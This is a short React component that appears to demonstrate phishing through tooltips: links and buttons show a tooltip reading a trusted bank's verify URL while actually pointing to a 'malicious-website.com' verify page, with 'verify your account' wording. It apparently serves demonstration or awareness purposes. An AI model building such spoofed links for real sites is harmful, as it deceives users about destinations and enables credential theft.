import React from 'react';
import { Tooltip } from "react-tooltip";
import './App.css';

function App() {
  return (
    <div className="App">
      <header className="App-header">
          {/* Text with Tooltip, using anchor data attributes */}
          <a
            href="https://malicious-website.com/verify" 
            data-tooltip-id="my-tooltip"
            data-tooltip-content="https://www.trustedbank.com/verify"
            data-tooltip-place="top"
            className="link-text"
          >
            Please Verify Here
          </a>


          {/* Button with Tooltip, using anchor data attributes */}
          <button 
          href="https://malicious-website.com/verify"
          data-tooltip-id="my-tooltip" 
          data-tooltip-content="https://www.trustedbank.com/verify"
          data-tooltip-place="bottom"
          className="link-button"
        >
          Hover over this button
        </button>

          {/* set the tooltip id, add className can set the size of tooltip */}
          <Tooltip id="my-tooltip"  className="custom-tooltip" />


        

        <br></br><br></br>

        {/* Text with Tooltip, using ReactTooltip props */}
        <a className="my-anchor-element" href="https://malicious-website.com/verify">Using ReactTooltip props </a>
        <Tooltip anchorSelect=".my-anchor-element" place="bottom" className="custom-tooltip">
            https://www.trustedbank.com/verify
        </Tooltip>
        <br></br><br></br>


        { /* Text with clickable Tooltip, adding link in the button inside of tooltip */}
        <button id="clickable" className="link-button">More Information</button>
        <Tooltip anchorSelect="#clickable" clickable>
          <button 
            onClick={() => window.location.href='https://malicious-website.com/verify'} >
              Please click here to verify your account</button>
          
        </Tooltip>
        

    </header>
  </div>
  );
}

export default App;
